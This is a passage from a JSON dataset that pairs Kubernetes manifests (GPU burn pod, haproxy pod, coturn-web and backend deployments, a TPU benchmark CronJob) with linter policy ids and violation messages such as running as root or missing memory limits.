    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: gpu-burn\n  name: gpu-burn-{{ gpu_node_name }}\n  namespace: default\nspec:\n  containers:\n  - image: nvcr.io/nvidia/cuda:11.2.2-devel-ubi8\n    imagePullPolicy: Always\n    name: gpu-burn-ctr\n    command:\n    - /bin/entrypoint.sh\n    volumeMounts:\n    - name: entrypoint\n      mountPath: /bin/entrypoint.sh\n      readOnly: true\n      subPath: entrypoint.sh\n    env:\n    - name: GPU_BURN_TIME\n      value: '{{ gpu_burn_time }}'\n  volumes:\n  - name: entrypoint\n    configMap:\n      defaultMode: 448\n      name: gpu-burn-entrypoint\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"gpu-burn-ctr\" does not have a read-only root file system"
  },
  {
    "id": "8010",
    "manifest_path": "data/manifests/the_stack_sample/sample_2966.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: gpu-burn\n  name: gpu-burn-{{ gpu_node_name }}\n  namespace: default\nspec:\n  containers:\n  - image: nvcr.io/nvidia/cuda:11.2.2-devel-ubi8\n    imagePullPolicy: Always\n    name: gpu-burn-ctr\n    command:\n    - /bin/entrypoint.sh\n    volumeMounts:\n    - name: entrypoint\n      mountPath: /bin/entrypoint.sh\n      readOnly: true\n      subPath: entrypoint.sh\n    env:\n    - name: GPU_BURN_TIME\n      value: '{{ gpu_burn_time }}'\n  volumes:\n  - name: entrypoint\n    configMap:\n      defaultMode: 448\n      name: gpu-burn-entrypoint\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"gpu-burn-ctr\" is not set to runAsNonRoot"
  },
  {
    "id": "8011",
    "manifest_path": "data/manifests/the_stack_sample/sample_2966.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: gpu-burn\n  name: gpu-burn-{{ gpu_node_name }}\n  namespace: default\nspec:\n  containers:\n  - image: nvcr.io/nvidia/cuda:11.2.2-devel-ubi8\n    imagePullPolicy: Always\n    name: gpu-burn-ctr\n    command:\n    - /bin/entrypoint.sh\n    volumeMounts:\n    - name: entrypoint\n      mountPath: /bin/entrypoint.sh\n      readOnly: true\n      subPath: entrypoint.sh\n    env:\n    - name: GPU_BURN_TIME\n      value: '{{ gpu_burn_time }}'\n  volumes:\n  - name: entrypoint\n    configMap:\n      defaultMode: 448\n      name: gpu-burn-entrypoint\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"gpu-burn-ctr\" has cpu request 0"
  },
  {
    "id": "8012",
    "manifest_path": "data/manifests/the_stack_sample/sample_2966.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    app: gpu-burn\n  name: gpu-burn-{{ gpu_node_name }}\n  namespace: default\nspec:\n  containers:\n  - image: nvcr.io/nvidia/cuda:11.2.2-devel-ubi8\n    imagePullPolicy: Always\n    name: gpu-burn-ctr\n    command:\n    - /bin/entrypoint.sh\n    volumeMounts:\n    - name: entrypoint\n      mountPath: /bin/entrypoint.sh\n      readOnly: true\n      subPath: entrypoint.sh\n    env:\n    - name: GPU_BURN_TIME\n      value: '{{ gpu_burn_time }}'\n  volumes:\n  - name: entrypoint\n    configMap:\n      defaultMode: 448\n      name: gpu-burn-entrypoint\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"gpu-burn-ctr\" has memory limit 0"
  },
  {
    "id": "8013",
    "manifest_path": "data/manifests/the_stack_sample/sample_2967.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: ''\n  labels:\n    component: haproxy\n    tier: control-plane\n  name: kube-haproxy\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-haproxy\n    image: docker.io/haproxy:1.7-alpine\n    resources:\n      requests:\n        cpu: 100m\n    volumeMounts:\n    - name: haproxy-cfg\n      readOnly: true\n      mountPath: /usr/local/etc/haproxy/haproxy.cfg\n  volumes:\n  - name: haproxy-cfg\n    hostPath:\n      path: /etc/haproxy/haproxy.cfg\n      type: FileOrCreate\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "8014",
    "manifest_path": "data/manifests/the_stack_sample/sample_2967.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: ''\n  labels:\n    component: haproxy\n    tier: control-plane\n  name: kube-haproxy\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-haproxy\n    image: docker.io/haproxy:1.7-alpine\n    resources:\n      requests:\n        cpu: 100m\n    volumeMounts:\n    - name: haproxy-cfg\n      readOnly: true\n      mountPath: /usr/local/etc/haproxy/haproxy.cfg\n  volumes:\n  - name: haproxy-cfg\n    hostPath:\n      path: /etc/haproxy/haproxy.cfg\n      type: FileOrCreate\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"kube-haproxy\" does not have a read-only root file system"
  },
  {
    "id": "8015",
    "manifest_path": "data/manifests/the_stack_sample/sample_2967.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: ''\n  labels:\n    component: haproxy\n    tier: control-plane\n  name: kube-haproxy\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-haproxy\n    image: docker.io/haproxy:1.7-alpine\n    resources:\n      requests:\n        cpu: 100m\n    volumeMounts:\n    - name: haproxy-cfg\n      readOnly: true\n      mountPath: /usr/local/etc/haproxy/haproxy.cfg\n  volumes:\n  - name: haproxy-cfg\n    hostPath:\n      path: /etc/haproxy/haproxy.cfg\n      type: FileOrCreate\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"kube-haproxy\" is not set to runAsNonRoot"
  },
  {
    "id": "8016",
    "manifest_path": "data/manifests/the_stack_sample/sample_2967.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  annotations:\n    scheduler.alpha.kubernetes.io/critical-pod: ''\n  labels:\n    component: haproxy\n    tier: control-plane\n  name: kube-haproxy\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-haproxy\n    image: docker.io/haproxy:1.7-alpine\n    resources:\n      requests:\n        cpu: 100m\n    volumeMounts:\n    - name: haproxy-cfg\n      readOnly: true\n      mountPath: /usr/local/etc/haproxy/haproxy.cfg\n  volumes:\n  - name: haproxy-cfg\n    hostPath:\n      path: /etc/haproxy/haproxy.cfg\n      type: FileOrCreate\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-haproxy\" has memory limit 0"
  },
  {
    "id": "8017",
    "manifest_path": "data/manifests/the_stack_sample/sample_2969.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: coturn-web\n  labels:\n    app: coturn-web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: coturn-web\n  template:\n    metadata:\n      labels:\n        app: coturn-web\n    spec:\n      serviceAccount: coturn-web\n      containers:\n      - name: coturn-web\n        image: ghcr.io/selkies-project/selkies-gstreamer/coturn-web:latest\n        imagePullPolicy: Always\n        env:\n        - name: TURN_SHARED_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_SHARED_SECRET\n        - name: TURN_REALM\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_REALM\n        - name: PORT\n          value: '8080'\n        - name: EXTERNAL_IP\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_EXTERNAL_IP\n        - name: TURN_PORT\n          value: '80'\n        - name: TURN_ALT_PORT\n          value: '443'\n        - name: AUTH_HEADER_NAME\n          value: x-goog-authenticated-user-email\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n        ports:\n        - name: http\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n",
    "policy_id": "deprecated-service-account-field",
    "violation_text": "serviceAccount is specified (coturn-web), but this field is deprecated; use serviceAccountName instead"
  },
  {
    "id": "8018",
    "manifest_path": "data/manifests/the_stack_sample/sample_2969.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: coturn-web\n  labels:\n    app: coturn-web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: coturn-web\n  template:\n    metadata:\n      labels:\n        app: coturn-web\n    spec:\n      serviceAccount: coturn-web\n      containers:\n      - name: coturn-web\n        image: ghcr.io/selkies-project/selkies-gstreamer/coturn-web:latest\n        imagePullPolicy: Always\n        env:\n        - name: TURN_SHARED_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_SHARED_SECRET\n        - name: TURN_REALM\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_REALM\n        - name: PORT\n          value: '8080'\n        - name: EXTERNAL_IP\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_EXTERNAL_IP\n        - name: TURN_PORT\n          value: '80'\n        - name: TURN_ALT_PORT\n          value: '443'\n        - name: AUTH_HEADER_NAME\n          value: x-goog-authenticated-user-email\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n        ports:\n        - name: http\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"coturn-web\" is using an invalid container image, \"ghcr.io/selkies-project/selkies-gstreamer/coturn-web:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8019",
    "manifest_path": "data/manifests/the_stack_sample/sample_2969.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: coturn-web\n  labels:\n    app: coturn-web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: coturn-web\n  template:\n    metadata:\n      labels:\n        app: coturn-web\n    spec:\n      serviceAccount: coturn-web\n      containers:\n      - name: coturn-web\n        image: ghcr.io/selkies-project/selkies-gstreamer/coturn-web:latest\n        imagePullPolicy: Always\n        env:\n        - name: TURN_SHARED_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_SHARED_SECRET\n        - name: TURN_REALM\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_REALM\n        - name: PORT\n          value: '8080'\n        - name: EXTERNAL_IP\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_EXTERNAL_IP\n        - name: TURN_PORT\n          value: '80'\n        - name: TURN_ALT_PORT\n          value: '443'\n        - name: AUTH_HEADER_NAME\n          value: x-goog-authenticated-user-email\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n        ports:\n        - name: http\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"coturn-web\" does not have a read-only root file system"
  },
  {
    "id": "8020",
    "manifest_path": "data/manifests/the_stack_sample/sample_2969.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: coturn-web\n  labels:\n    app: coturn-web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: coturn-web\n  template:\n    metadata:\n      labels:\n        app: coturn-web\n    spec:\n      serviceAccount: coturn-web\n      containers:\n      - name: coturn-web\n        image: ghcr.io/selkies-project/selkies-gstreamer/coturn-web:latest\n        imagePullPolicy: Always\n        env:\n        - name: TURN_SHARED_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_SHARED_SECRET\n        - name: TURN_REALM\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_REALM\n        - name: PORT\n          value: '8080'\n        - name: EXTERNAL_IP\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_EXTERNAL_IP\n        - name: TURN_PORT\n          value: '80'\n        - name: TURN_ALT_PORT\n          value: '443'\n        - name: AUTH_HEADER_NAME\n          value: x-goog-authenticated-user-email\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n        ports:\n        - name: http\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"coturn-web\" not found"
  },
  {
    "id": "8021",
    "manifest_path": "data/manifests/the_stack_sample/sample_2969.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: coturn-web\n  labels:\n    app: coturn-web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: coturn-web\n  template:\n    metadata:\n      labels:\n        app: coturn-web\n    spec:\n      serviceAccount: coturn-web\n      containers:\n      - name: coturn-web\n        image: ghcr.io/selkies-project/selkies-gstreamer/coturn-web:latest\n        imagePullPolicy: Always\n        env:\n        - name: TURN_SHARED_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_SHARED_SECRET\n        - name: TURN_REALM\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_REALM\n        - name: PORT\n          value: '8080'\n        - name: EXTERNAL_IP\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_EXTERNAL_IP\n        - name: TURN_PORT\n          value: '80'\n        - name: TURN_ALT_PORT\n          value: '443'\n        - name: AUTH_HEADER_NAME\n          value: x-goog-authenticated-user-email\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n        ports:\n        - name: http\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"coturn-web\" is not set to runAsNonRoot"
  },
  {
    "id": "8022",
    "manifest_path": "data/manifests/the_stack_sample/sample_2969.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: coturn-web\n  labels:\n    app: coturn-web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: coturn-web\n  template:\n    metadata:\n      labels:\n        app: coturn-web\n    spec:\n      serviceAccount: coturn-web\n      containers:\n      - name: coturn-web\n        image: ghcr.io/selkies-project/selkies-gstreamer/coturn-web:latest\n        imagePullPolicy: Always\n        env:\n        - name: TURN_SHARED_SECRET\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_SHARED_SECRET\n        - name: TURN_REALM\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_REALM\n        - name: PORT\n          value: '8080'\n        - name: EXTERNAL_IP\n          valueFrom:\n            secretKeyRef:\n              name: turn-shared-secret\n              key: TURN_EXTERNAL_IP\n        - name: TURN_PORT\n          value: '80'\n        - name: TURN_ALT_PORT\n          value: '443'\n        - name: AUTH_HEADER_NAME\n          value: x-goog-authenticated-user-email\n        readinessProbe:\n          tcpSocket:\n            port: 8080\n        ports:\n        - name: http\n          containerPort: 8080\n        resources:\n          requests:\n            cpu: 50m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"coturn-web\" has memory limit 0"
  },
  {
    "id": "8023",
    "manifest_path": "data/manifests/the_stack_sample/sample_2970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    app: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend\n  template:\n    metadata:\n      labels:\n        app: backend\n    spec:\n      containers:\n      - name: backend\n        image: gcr.io/driven-vortex-230214/backend:cv-backend-2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8024",
    "manifest_path": "data/manifests/the_stack_sample/sample_2970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    app: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend\n  template:\n    metadata:\n      labels:\n        app: backend\n    spec:\n      containers:\n      - name: backend\n        image: gcr.io/driven-vortex-230214/backend:cv-backend-2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"backend\" does not have a read-only root file system"
  },
  {
    "id": "8025",
    "manifest_path": "data/manifests/the_stack_sample/sample_2970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    app: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend\n  template:\n    metadata:\n      labels:\n        app: backend\n    spec:\n      containers:\n      - name: backend\n        image: gcr.io/driven-vortex-230214/backend:cv-backend-2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"backend\" is not set to runAsNonRoot"
  },
  {
    "id": "8026",
    "manifest_path": "data/manifests/the_stack_sample/sample_2970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    app: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend\n  template:\n    metadata:\n      labels:\n        app: backend\n    spec:\n      containers:\n      - name: backend\n        image: gcr.io/driven-vortex-230214/backend:cv-backend-2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"backend\" has cpu request 0"
  },
  {
    "id": "8027",
    "manifest_path": "data/manifests/the_stack_sample/sample_2970.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: backend\n  labels:\n    app: backend\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: backend\n  template:\n    metadata:\n      labels:\n        app: backend\n    spec:\n      containers:\n      - name: backend\n        image: gcr.io/driven-vortex-230214/backend:cv-backend-2\n        ports:\n        - containerPort: 5000\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"backend\" has memory limit 0"
  },
  {
    "id": "8028",
    "manifest_path": "data/manifests/the_stack_sample/sample_2972.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: metricsmultiplexer\n  labels:\n    app: metricsmultiplexer\nspec:\n  selector:\n    app: metricsmultiplexer\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 443\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:metricsmultiplexer])"
  },
  {
    "id": "8029",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"monitor\" does not have a read-only root file system"
  },
  {
    "id": "8030",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - --d_inner=4096\n          - --untie_r=true\n          - --n_class=2\n          - --ff_activation=gelu\n          - --learning_rate=2e-5\n          - --warmup_steps=500\n          - --iterations=500\n          - --bi_data=false\n          - --summary_type=last\n          - --train_batch_size=32\n          - --test_batch_size=32\n          - --train_steps=4000\n          env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/tensorflow:nightly\n          imagePullPolicy: Always\n          name: train\n          resources:\n            limits:\n              cloud-tpus.google.com/v3: 8\n            requests:\n              cpu: 2\n              memory: 20G\n          volumeMounts:\n          - mountPath: /dev/shm\n            name: dshm\n            readOnly: false\n        initContainers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_UID\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.uid\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          - name: JOB_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.labels['job-name']\n          - name: MODEL_DIR\n            value: $(OUTPUT_BUCKET)/tf-nightly/xlnet-imdb/conv/v3-8/$(JOB_NAME)\n          - name: METRIC_CONFIG\n            value: \"{\\n \\\"metric_collection_config\\\": {\\n  \\\"default_aggregation_strategies\\\"\\\n              : [\\n   \\\"final\\\"\\n  ],\\n  \\\"metric_to_aggregation_strategies\\\": {\\n\\\n              \\   \\\"examples_per_second\\\": [\\n    \\\"average\\\"\\n   ]\\n  },\\n  \\\"use_run_name_prefix\\\"\\\n              : true,\\n  \\\"write_to_bigquery\\\": true\\n },\\n \\\"regression_test_config\\\"\\\n              : {\\n  \\\"metric_success_conditions\\\": {\\n   \\\"examples_per_second_average\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"greater_or_equal\\\",\\n    \\\"success_threshold\\\"\\\n              : {\\n     \\\"stddevs_from_mean\\\": 2\\n    }\\n   },\\n   \\\"total_wall_time\\\"\\\n              : {\\n    \\\"comparison\\\": \\\"less\\\",\\n    \\\"success_threshold\\\": {\\n \\\n              \\    \\\"stddevs_from_mean\\\": 5\\n    },\\n    \\\"wait_for_n_points_of_history\\\"\\\n              : 10\\n   }\\n  }\\n },\\n \\\"test_name\\\": \\\"tf-nightly-xlnet-imdb-conv-v3-8\\\"\\\n              \\n}\\n\"\n          envFrom:\n          - configMapRef:\n              name: gcs-buckets\n          image: gcr.io/xl-ml-test/publisher:stable\n          imagePullPolicy: Always\n          name: publisher\n        volumes:\n        - emptyDir:\n            medium: Memory\n          name: dshm\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"publisher\" does not have a read-only root file system"
  },
  {
    "id": "8031",
    "manifest_path": "data/manifests/the_stack_sample/sample_2973.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  labels:\n    accelerator: v3-8\n    benchmarkId: tf-nightly-xlnet-imdb-conv-v3-8\n    frameworkVersion: tf-nightly\n    mode: conv\n    model: xlnet-imdb\n  name: tf-nightly-xlnet-imdb-conv-v3-8\n  namespace: automated\nspec:\n  jobTemplate:\n    template:\n      metadata:\n        annotations:\n          reserved.cloud-tpus.google.com: 'false'\n          tf-version.cloud-tpus.google.com: nightly\n      spec:\n        containers:\n        - env:\n          - name: POD_NAME\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.name\n          - name: POD_NAMESPACE\n            valueFrom:\n              fieldRef:\n                fieldPath: metadata.namespace\n          image: gcr.io/xl-ml-test/health-monitor:stable\n          imagePullPolicy: Always\n          name: monitor\n        - args:\n          - python3\n          - official/nlp/xlnet/run_classifier.py\n          - --strategy_type=tpu\n          - --tpu=$(KUBE_GOOGLE_CLOUD_TPU_ENDPOINTS)\n          - --train_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.train.tf_record\n          - --test_tfrecord_path=$(XLNET_IMDB_DIR)/spiece.model.len-512.dev.eval.tf_record\n          - --init_checkpoint=$(XLNET_CHECKPOINT_DIR)/xlnet_model.ckpt\n          - --model_dir=$(MODEL_DIR)\n          - --test_data_size=25024\n          - --seq_len=512\n          - --n_layer=24\n          - --d_model=1024\n          - --d_embed=1024\n          - --n_head=16\n          - --d_head=64\n          - 